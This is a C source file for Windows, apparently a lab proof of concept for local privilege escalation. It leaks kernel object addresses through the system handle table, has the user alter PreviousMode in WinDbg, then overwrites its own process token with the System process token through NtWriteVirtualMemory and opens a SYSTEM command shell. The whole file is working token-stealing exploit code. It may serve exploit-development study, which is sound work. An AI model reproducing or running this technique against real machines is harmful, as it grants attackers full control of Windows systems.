#include <stdio.h>
#include "defines.h"
#define STATUS_INFO_LENGTH_MISMATCH 0xc0000004

_NtQuerySystemInformation pNtQuerySystemInformation;
_NtWriteVirtualMemory pNtWriteVirtualMemory;
_NtReadVirtualMemory pNtReadVIrtualMemory;




void GetNtFunction() {
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	//NTSTATUS ntStatus;

	pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	pNtWriteVirtualMemory = (_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	pNtReadVIrtualMemory = (_NtReadVirtualMemory)GetProcAddress(ntdll, "NtReadVirtualMemory");
}


PVOID GetObj(PULONGLONG objptr, ULONG pid, HANDLE handle)
{
	NTSTATUS ntStatus;

	ULONG system_handle_info_size = 4096;
	PSYSTEM_HANDLE_INFORMATION system_handle_info = (PSYSTEM_HANDLE_INFORMATION)malloc(system_handle_info_size);
	memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

	while ((ntStatus = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH)
	{
		system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 10);
		if (system_handle_info == NULL)
		{
			printf("[!] Error while allocating memory for NtQuerySystemInformation: %d\n", GetLastError());
			exit(1);
		}
	}

	for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
	{
		if (system_handle_info->Handles[i].UniqueProcessId == (USHORT)pid)
		{
			if (system_handle_info->Handles[i].HandleValue == handle)
			{
				*objptr = system_handle_info->Handles[i].Object;
			}

		}
	}
}


int main() {
	PVOID KTHREAD = NULL;
	PVOID SYSTEM_EPROCESS = NULL;
	PVOID EPROCESS = NULL;

	ULONG dwbytes = 0;
	GetNtFunction();

	DWORD pid = GetCurrentProcessId();
	
	HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, TRUE, GetCurrentThreadId());
	GetObj(&KTHREAD, pid, hThread);
	printf("[+] Current KTHREAD: %p\n", KTHREAD);

	HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	GetObj(&EPROCESS, pid, hProc);
	printf("[+] Current EPROCESS: %p\n", EPROCESS);


	GetObj(&SYSTEM_EPROCESS, 4, (HANDLE)4);
	printf("[+] System EPROCESS: %p\n", SYSTEM_EPROCESS);

	printf("modify previousmode/sedebugprivilege in windbg and press any button..\n");
	getch();


	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)EPROCESS + 0x4b8 , (ULONGLONG)SYSTEM_EPROCESS + 0x4b8, sizeof(ULONGLONG), &dwbytes);
	
	
	char* restoreBuffer = (char*)malloc(sizeof(CHAR));
	*restoreBuffer = 1;
	
	pNtWriteVirtualMemory(GetCurrentProcess(), (ULONGLONG)KTHREAD + 0x232, (PVOID)restoreBuffer, sizeof(CHAR), &dwbytes);
	

	system("cmd.exe");
	
}


